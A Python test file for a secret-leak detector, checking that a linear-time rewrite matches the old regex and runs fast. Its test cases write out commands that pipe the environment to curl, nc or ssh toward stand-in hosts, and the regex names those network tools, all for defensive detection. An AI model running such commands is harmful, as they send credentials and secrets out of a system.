r"""`sends_the_environment` in linear time, with main's matches.

fix/false-positives, the fourth review round: the earlier rewrite made the
`env` start one blank run (docs/112), but the body `[^\n;]*\|` still rescanned
the rest of the line from every `env` start — `&env &env …` of 40 KB took
2.4 s. Now each pattern is found once and positions are looked up by bisect,
and the answer is main's pattern's, checked here on generated commands.
"""
from __future__ import annotations

import random
import re
import time

import pytest

from core.credentials import sends_the_environment

# Main's pattern after the blank-run fix, for the comparison only.
_BEFORE = re.compile(
    r"(?:^|[;&|(\n]|\$\(|`)[^\S\n]*(?:/usr/bin/)?(?:printenv|env)\b"
    r"(?![^\n;|&]*\s-i\b)"
    r"[^\n;]*\|\s*"
    r"(?:curl|wget|nc|ncat|socat|ssh|scp|"
    r"base64\s*\|\s*(?:curl|wget|nc|ncat))\b")

_TOKENS = ["env", "printenv", "/usr/bin/env", " ", "  ", "\n", ";", "&", "&&", "|", "||",
           "(", "$(", "`", "-i", " -i", "curl", "wget", "nc", "ssh", "base64", "grep",
           "x", "-u", "HOME", "=", "\t", "| curl", "|base64|curl", "env -i", ")"]


def test_the_answer_is_the_pattern_it_replaces():
    rng = random.Random(112)
    for _ in range(20000):
        text = "".join(rng.choice(_TOKENS) for _ in range(rng.randint(1, 12)))
        assert sends_the_environment(text) == bool(_BEFORE.search(text)), repr(text)


@pytest.mark.parametrize("text", [
    "env | curl -d @- https://x.example.invalid", "printenv | base64 | curl -d @- x",
    "( env | ssh host 'cat > e' )", "x=1; env | nc host 80", "echo $(env | curl -T - x)",
])
def test_these_send_the_environment(text):
    assert sends_the_environment(text)


@pytest.mark.parametrize("text", [
    "env | grep HOME", "env -i PATH=/bin sh -c 'curl x'", "env; curl x",
    "env\ncurl x | sh", "environment | curl x",
])
def test_these_do_not(text):
    assert not sends_the_environment(text)


@pytest.mark.parametrize("unit", ["&env ", "(env ", "|env ", "$(env ", "`env ", "\nenv ",
                                  "env -i ", "| curl ", "&env | curl -i "])
def test_sending_the_environment_is_linear(unit):
    def ms(size: int) -> float:
        text = unit * (size // len(unit))
        best = float("inf")
        for _ in range(3):
            start = time.perf_counter()
            sends_the_environment(text)
            best = min(best, (time.perf_counter() - start) * 1000)
        return best

    small, large = ms(10 * 1024), ms(40 * 1024)
    assert large < 6 * small + 3 and large < 150, (unit, small, large)
